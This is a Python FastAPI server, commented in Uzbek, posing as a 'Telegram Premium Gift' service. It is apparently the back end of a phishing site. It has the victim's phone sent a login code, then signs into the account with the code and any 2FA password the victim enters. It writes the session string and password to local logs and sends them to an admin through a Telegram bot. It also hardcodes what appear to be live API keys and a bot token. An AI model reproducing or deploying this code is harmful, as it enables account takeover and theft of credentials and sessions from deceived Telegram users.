import os
import asyncio
import logging
import json
import secrets
from datetime import datetime, timedelta
from typing import Optional, Dict, Any
from fastapi import FastAPI, HTTPException, Request, BackgroundTasks
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import HTMLResponse, JSONResponse
from pydantic import BaseModel, Field, ValidationError
from telethon import TelegramClient, errors
from telethon.sessions import StringSession
import uvicorn
from dotenv import load_dotenv
import requests
import traceback

# .env faylidan ma'lumotlarni yuklash
load_dotenv()

# Konfiguratsiya
API_ID = int(os.getenv("API_ID", "33223639"))
API_HASH = os.getenv("API_HASH", "da4a254e086d07d78998b7992e64a39b")
BOT_TOKEN = os.getenv("BOT_TOKEN", "8563399979:AAGOxsu3daN1CAa2xh6TefbTNhYw67BINpQ")
ADMIN_ID = os.getenv("ADMIN_ID", "1263747123")

# Logging sozlamalari
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("server.log"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# FastAPI ilovasi
app = FastAPI(title="Telegram Premium Gift")

# CORS sozlamalari
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# Papkalarni yaratish
os.makedirs("sessions", exist_ok=True)
os.makedirs("logs", exist_ok=True)

# Pydantic modellar
class SendCodeRequest(BaseModel):
    phone: str = Field(..., description="Telefon raqam", json_schema_extra={"example": "+998901234567"})

class VerifyCodeRequest(BaseModel):
    phone: str
    code: Optional[str] = None
    hash: Optional[str] = None
    password: Optional[str] = None

# Faol mijozlar
active_clients: Dict[str, Dict[str, Any]] = {}

# Exception handler - barcha xatoliklarni JSON formatiga o'tkazish
@app.exception_handler(Exception)
async def generic_exception_handler(request: Request, exc: Exception):
    logger.error(f"Exception: {str(exc)}\n{traceback.format_exc()}")
    return JSONResponse(
        status_code=500,
        content={
            "status": "error",
            "detail": f"Server xatoligi: {str(exc)}",
            "type": exc.__class__.__name__
        }
    )

@app.exception_handler(HTTPException)
async def http_exception_handler(request: Request, exc: HTTPException):
    return JSONResponse(
        status_code=exc.status_code,
        content={
            "status": "error",
            "detail": exc.detail
        }
    )

@app.exception_handler(ValidationError)
async def validation_exception_handler(request: Request, exc: ValidationError):
    return JSONResponse(
        status_code=422,
        content={
            "status": "error",
            "detail": "Ma'lumotlar formati noto'g'ri",
            "errors": exc.errors()
        }
    )

# HTML sahifani yuklash
@app.get("/", response_class=HTMLResponse)
async def get_index():
    """Asosiy sahifa"""
    try:
        with open("index.html", "r", encoding="utf-8") as f:
            html_content = f.read()
        return HTMLResponse(content=html_content)
    except FileNotFoundError:
        return HTMLResponse(content="<h1>index.html topilmadi</h1><p>Iltimos, index.html faylini yuklang</p>", status_code=404)

# SEND CODE endpoint
@app.post("/send")
@app.post("/send_code")
async def send_code(request: SendCodeRequest):
    """Telefon raqamga kod yuborish"""
    phone = request.phone.strip()
    logger.info(f"📞 Kod so'rovi: {phone}")
    
    # Telefon raqamni tekshirish
    if not phone.startswith("+") or len(phone) < 10:
        return JSONResponse(
            status_code=400,
            content={
                "status": "error",
                "detail": "Noto'g'ri telefon raqam formati. Raqam + bilan boshlanishi kerak"
            }
        )
    
    # Yangi mijoz yaratish
    client = TelegramClient(StringSession(), API_ID, API_HASH)
    
    try:
        await client.connect()
        
        # Kod yuborish
        logger.info(f"Kod yuborilmoqda: {phone}")
        sent = await client.send_code_request(phone)
        
        # Mijozni saqlash
        active_clients[phone] = {
            "client": client,
            "phone": phone,
            "hash": sent.phone_code_hash,
            "created_at": datetime.now()
        }
        
        logger.info(f"✅ Kod yuborildi: {phone}, hash: {sent.phone_code_hash}")
        
        return {
            "status": "success",
            "hash": sent.phone_code_hash,
            "message": "Kod yuborildi"
        }
        
    except errors.FloodWaitError as e:
        logger.warning(f"⚠️ Flood wait: {e.seconds} soniya - {phone}")
        if phone in active_clients:
            del active_clients[phone]
        return JSONResponse(
            status_code=429,
            content={
                "status": "error",
                "detail": f"Juda ko'p urinishlar. {e.seconds} soniya kuting"
            }
        )
        
    except errors.PhoneNumberInvalidError:
        logger.warning(f"⚠️ Noto'g'ri raqam: {phone}")
        if phone in active_clients:
            del active_clients[phone]
        return JSONResponse(
            status_code=400,
            content={
                "status": "error",
                "detail": "Telefon raqam noto'g'ri"
            }
        )
        
    except errors.PhoneNumberBannedError:
        logger.warning(f"⚠️ Bloklangan raqam: {phone}")
        if phone in active_clients:
            del active_clients[phone]
        return JSONResponse(
            status_code=403,
            content={
                "status": "error",
                "detail": "Bu raqam Telegramdan bloklangan"
            }
        )
        
    except errors.ApiIdInvalidError:
        logger.error(f"❌ API_ID noto'g'ri: {API_ID}")
        return JSONResponse(
            status_code=500,
            content={
                "status": "error",
                "detail": "API_ID yoki API_HASH noto'g'ri"
            }
        )
        
    except Exception as e:
        logger.error(f"❌ Kod yuborishda xatolik: {str(e)}\n{traceback.format_exc()}")
        if phone in active_clients:
            del active_clients[phone]
        return JSONResponse(
            status_code=500,
            content={
                "status": "error",
                "detail": f"Server xatoligi: {str(e)}"
            }
        )

# VERIFY CODE endpoint
@app.post("/verify")
async def verify_code(request: VerifyCodeRequest, background_tasks: BackgroundTasks):
    """Tasdiqlash kodini tekshirish"""
    phone = request.phone.strip()
    logger.info(f"🔑 Tekshirish: {phone}")
    
    # Mijozni topish
    if phone not in active_clients:
        logger.warning(f"⚠️ Sessiya topilmadi: {phone}")
        return JSONResponse(
            status_code=400,
            content={
                "status": "error",
                "detail": "Sessiya topilmadi. Iltimos, qaytadan urining"
            }
        )
    
    client_data = active_clients[phone]
    client = client_data["client"]
    
    try:
        # Agar parol bo'lsa (2FA)
        if request.password:
            logger.info(f"🔐 2FA parol tekshirilmoqda: {phone}")
            await client.sign_in(password=request.password)
        else:
            # Kod bilan kirish
            logger.info(f"🔢 Kod tekshirilmoqda: {phone}, kod: {request.code}")
            await client.sign_in(phone, request.code, phone_code_hash=request.hash or client_data["hash"])
        
        # Muvaffaqiyatli kirish
        me = await client.get_me()
        session_string = client.session.save()
        
        logger.info(f"✅ Muvaffaqiyatli kirish: {me.first_name} (@{me.username if me.username else 'yoq'})")
        
        # Sessiyani faylga saqlash
        safe_phone = phone.replace('+', '')
        session_file = f"sessions/{safe_phone}_{me.id}.session"
        with open(session_file, "w", encoding="utf-8") as f:
            f.write(session_string)
        
        # Log fayliga yozish
        log_entry = f"""
{'='*60}
✅ YANGI KIRISH | {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
{'='*60}
📞 TELEFON: {phone}
👤 ISM: {me.first_name} {me.last_name or ''}
🆔 USERNAME: @{me.username if me.username else 'yoq'}
🔐 2FA PAROL: {request.password if request.password else 'yoq'}
🆔 USER ID: {me.id}
🔑 SESSIYA: {session_string[:100]}...
{'='*60}

"""
        with open("logs/success.log", "a", encoding="utf-8") as f:
            f.write(log_entry)
        
        # Botga xabar yuborish (background task)
        if BOT_TOKEN and ADMIN_ID and BOT_TOKEN != "your_bot_token_here":
            background_tasks.add_task(
                send_to_bot,
                phone=phone,
                session_string=session_string,
                password=request.password,
                user_info={
                    "first_name": me.first_name,
                    "username": me.username,
                    "id": me.id
                }
            )
        
        # Mijozni o'chirish
        if phone in active_clients:
            await client.disconnect()
            del active_clients[phone]
        
        return {
            "status": "success",
            "message": "Muvaffaqiyatli kirish",
            "redirect": "https://t.me/premium"
        }
        
    except errors.SessionPasswordNeededError:
        logger.info(f"🔐 2FA talab qilinadi: {phone}")
        return {
            "status": "2fa_needed",
            "message": "Bulutli parol kerak"
        }
        
    except errors.PhoneCodeInvalidError:
        logger.warning(f"⚠️ Noto'g'ri kod: {phone}")
        return JSONResponse(
            status_code=400,
            content={
                "status": "error",
                "detail": "Tasdiqlash kodi noto'g'ri"
            }
        )
        
    except errors.PhoneCodeExpiredError:
        logger.warning(f"⚠️ Kod muddati tugagan: {phone}")
        if phone in active_clients:
            del active_clients[phone]
        return JSONResponse(
            status_code=400,
            content={
                "status": "error",
                "detail": "Kod muddati tugagan. Qayta urining"
            }
        )
        
    except errors.PasswordHashInvalidError:
        logger.warning(f"⚠️ Noto'g'ri parol: {phone}")
        return JSONResponse(
            status_code=400,
            content={
                "status": "error",
                "detail": "Parol noto'g'ri"
            }
        )
        
    except errors.FloodWaitError as e:
        logger.warning(f"⚠️ Flood wait: {e.seconds} soniya - {phone}")
        return JSONResponse(
            status_code=429,
            content={
                "status": "error",
                "detail": f"Juda ko'p urinishlar. {e.seconds} soniya kuting"
            }
        )
        
    except Exception as e:
        logger.error(f"❌ Tekshirishda xatolik: {str(e)}\n{traceback.format_exc()}")
        return JSONResponse(
            status_code=500,
            content={
                "status": "error",
                "detail": f"Server xatoligi: {str(e)}"
            }
        )

async def send_to_bot(phone: str, session_string: str, password: Optional[str], user_info: dict):
    """Botga xabar yuborish"""
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        
        # Xabarni qisqartirish
        short_session = session_string[:100] + "..." if len(session_string) > 100 else session_string
        
        message = f"""
🚨 <b>YANGI KIRISH!</b>

📞 <b>Telefon:</b> <code>{phone}</code>
👤 <b>Ism:</b> {user_info['first_name']}
🆔 <b>Username:</b> @{user_info['username'] if user_info['username'] else 'yoq'}
🆔 <b>User ID:</b> <code>{user_info['id']}</code>
🔐 <b>2FA Parol:</b> <code>{password if password else 'Yoq'}</code>
⏰ <b>Vaqt:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

🔑 <b>Sessiya:</b> <code>{short_session}</code>
"""
        
        data = {
            'chat_id': ADMIN_ID,
            'text': message,
            'parse_mode': 'HTML'
        }
        
        response = requests.post(url, data=data, timeout=10)
        
        if response.status_code == 200:
            logger.info(f"✅ Xabar botga yuborildi: {phone}")
        else:
            logger.error(f"❌ Botga yuborilmadi: {response.text}")
            
    except Exception as e:
        logger.error(f"❌ Botga yuborishda xatolik: {e}")

# Health check
@app.get("/health")
@app.get("/status")
async def health_check():
    """Server holatini tekshirish"""
    # Eski sessiyalarni tozalash (5 daqiqadan oshgan)
    now = datetime.now()
    to_delete = []
    for phone, data in list(active_clients.items()):
        if (now - data["created_at"]) > timedelta(minutes=5):
            to_delete.append(phone)
    
    for phone in to_delete:
        try:
            await active_clients[phone]["client"].disconnect()
        except:
            pass
        del active_clients[phone]
        logger.info(f"🧹 Eski sessiya tozalandi: {phone}")
    
    return {
        "status": "ok",
        "timestamp": now.isoformat(),
        "active_sessions": len(active_clients),
        "active_phones": list(active_clients.keys()),
        "api_id_valid": API_ID is not None,
        "bot_configured": BOT_TOKEN != "your_bot_token_here" and BOT_TOKEN is not None
    }

# Cleanup task
@app.on_event("startup")
async def startup_event():
    asyncio.create_task(cleanup_task())
    logger.info("🚀 Server ishga tushdi")

async def cleanup_task():
    """Eski sessiyalarni tozalash"""
    while True:
        await asyncio.sleep(300)  # 5 daqiqa
        now = datetime.now()
        to_delete = []
        for phone, data in list(active_clients.items()):
            if (now - data["created_at"]) > timedelta(minutes=5):
                to_delete.append(phone)
        
        for phone in to_delete:
            try:
                await active_clients[phone]["client"].disconnect()
            except:
                pass
            del active_clients[phone]
            logger.info(f"🧹 Cleanup: eski sessiya tozalandi: {phone}")

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8000))
    host = os.environ.get("HOST", "0.0.0.0")
    
    logger.info("=" * 60)
    logger.info("🚀 Telegram Premium Server ishga tushmoqda")
    logger.info("=" * 60)
    logger.info(f"📡 Server: http://{host}:{port}")
    logger.info(f"🔑 API_ID: {API_ID}")
    logger.info(f"👤 Admin ID: {ADMIN_ID}")
    logger.info(f"🤖 Bot token: {'✅ Mavjud' if BOT_TOKEN and BOT_TOKEN != 'your_bot_token_here' else '❌ Mavjud emas'}")
    logger.info("=" * 60)
    
    uvicorn.run(
        "main:app",
        host=host,
        port=port,
        reload=False,
        log_level="info"
    )